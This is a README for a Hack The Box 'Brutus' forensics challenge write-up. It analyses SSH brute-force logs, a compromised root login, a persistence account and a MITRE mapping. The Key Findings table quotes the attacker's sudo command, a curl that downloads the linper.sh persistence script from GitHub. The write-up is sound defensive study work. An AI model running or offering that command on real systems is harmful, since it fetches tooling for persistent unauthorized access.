# HTB Sherlock: Brutus

<details>
<summary>Investigation overview</summary>

| Field | Details |
|---|---|
| Platform | Hack The Box |
| Sherlock | Brutus |
| Difficulty | Very Easy |
| Category | DFIR / Linux Forensics |
| Primary artifacts | `auth.log`, `wtmp` |
| Status | Completed |

</details>

## Executive Summary

Brutus investigates suspicious SSH authentication activity against a Linux server. The investigation focuses on identifying brute-force attempts, confirming successful authentication, examining interactive login sessions, and identifying post-compromise activity.

Analysis of the supplied authentication logs identified repeated SSH authentication failures originating from `65.2.161.68`. The same address subsequently authenticated successfully as `root`.

Further investigation identified a newly created local account, `cyberjunkie`, and evidence of privileged command execution through `sudo`.

## Key Findings

| Investigation item | Finding |
|---|---|
| Attacker IP address | `65.2.161.68` |
| Compromised account | `root` |
| Interactive login timestamp | `2024-03-06 06:32:45 UTC` — timezone conversion pending verification |
| SSH session number | `37` |
| Persistence account | `cyberjunkie` |
| MITRE ATT&CK sub-technique | `T1136.001` — Create Account: Local Account |
| First SSH session end | Pending evidence verification |
| Privileged command | `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` |

## Evidence and Artifacts

The investigation uses two primary Linux forensic artifacts:

- **`auth.log`** — records authentication events, SSH activity, account-related events, and sudo command execution.
- **`wtmp`** — records login and logout session history, including interactive terminal sessions.

The detailed investigation, commands, evidence interpretation, timeline, and answers are documented in [the full writeup](writeup.md).

## Screenshots

Investigation screenshots will be stored in the `screenshots/` directory.

| Screenshot | Description |
|---|---|
| `01-scenario.png` | Sherlock scenario |
| `02-auth-log-analysis.png` | Authentication log investigation |
| `03-bruteforce-evidence.png` | Repeated SSH authentication failures |
| `04-successful-login.png` | Successful root authentication |
| `05-wtmp-analysis.png` | WTMP session analysis |
| `06-session-investigation.png` | SSH session identification |
| `07-persistence-account.png` | Creation of the persistence account |
| `08-mitre-mapping.png` | MITRE ATT&CK mapping |
| `09-sudo-command.png` | Privileged command execution |
| `completion-badge.png` | HTB completion badge |

## Skills Demonstrated

- Linux authentication log analysis
- SSH brute-force investigation
- Successful authentication identification
- WTMP analysis and session reconstruction
- Linux account and privilege investigation
- Incident timeline development
- MITRE ATT&CK mapping
- Evidence-based forensic reporting

## Repository Structure

```text
Brutus/
├── README.md
├── writeup.md
├── evidence/
└── screenshots/
    ├── 01-scenario.png
    ├── 02-auth-log-analysis.png
    ├── 03-bruteforce-evidence.png
    ├── 04-successful-login.png
    ├── 05-wtmp-analysis.png
    ├── 06-session-investigation.png
    ├── 07-persistence-account.png
    ├── 08-mitre-mapping.png
    ├── 09-sudo-command.png
    └── completion-badge.png
```

## Disclaimer

This writeup documents an authorized Hack The Box Sherlock investigation conducted for educational purposes. Findings and conclusions are based on the challenge artifacts and the investigation evidence presented here.
